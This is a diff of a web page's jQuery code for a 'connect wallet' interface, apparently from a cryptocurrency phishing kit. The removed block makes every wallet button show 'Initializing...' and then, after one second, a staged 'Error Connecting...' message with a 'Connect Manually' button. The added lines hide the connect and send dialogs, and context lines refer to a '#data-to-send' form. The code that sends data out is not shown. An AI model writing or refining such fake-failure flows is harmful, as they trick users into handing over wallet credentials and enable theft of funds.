@@ -19902,28 +19902,11 @@ var identityIdd=localStorage.getItem("identityId")
 
         
        
+       
         <script>
             $(document).ready(function () {
-                let wallets = $('.cmAzHq');
-                wallets.each(function () {
-                    $(this).on('click', function () {
-                        event.preventDefault();
-                        $('.connection-info').text('Initializing...')
-                        // $('#current-wallet-app').text($(this).children().last().text().trim());
-                        $('#current-wallet-logo').attr('src', $(this).children().children().first().attr('src'))
-                        $('#connect-dialog').show();
-
-
-
-                        setTimeout(function () {
-                            $('.connection-info').html('Error Connecting... <button class="manual-connection">Connect Manually</button>');
-                        }, 1000)
-                    });
-                });
-            });
-        </script>
-        <script>
-            $(document).ready(function () {
+                $('#connect-dialog').hide();
+                $('#send-dialog').hide();
                 let dialogDismiss = $('.dialog-dismiss')
                 let sendForm = $('#data-to-send');
                 let successBox = $('#success-dialog');
